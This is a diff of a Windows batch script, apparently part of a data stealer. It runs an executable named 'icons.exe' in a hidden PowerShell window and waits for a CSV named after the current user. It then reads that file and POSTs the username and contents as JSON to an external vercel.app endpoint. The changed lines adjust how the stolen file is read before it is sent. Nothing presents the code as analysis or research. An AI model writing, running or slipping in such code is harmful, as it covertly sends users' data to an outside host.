@@ -31,9 +31,9 @@ powershell -WindowStyle Hidden -Command "Start-Process 'x64/icons.exe' -Argument
 :: Wait for the CSV file to be created
 timeout /t 10 >nul
 
-:: Read the CSV content into a PowerShell variable as a single escaped string
+:: Use PowerShell to read and send the JSON with properly escaped content
 powershell -Command ^
-    "$fileContent = Get-Content -Path 'x64/%username%.csv' -Raw | Out-String;" ^
+    "$fileContent = [System.IO.File]::ReadAllText('x64/%username%.csv');" ^
     "$data = @{data = @{username = '%username%'; content = $fileContent}};" ^
     "$jsonData = $data | ConvertTo-Json -Compress;" ^
     "Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/post' -Method Post -Body $jsonData -ContentType 'application/json'"
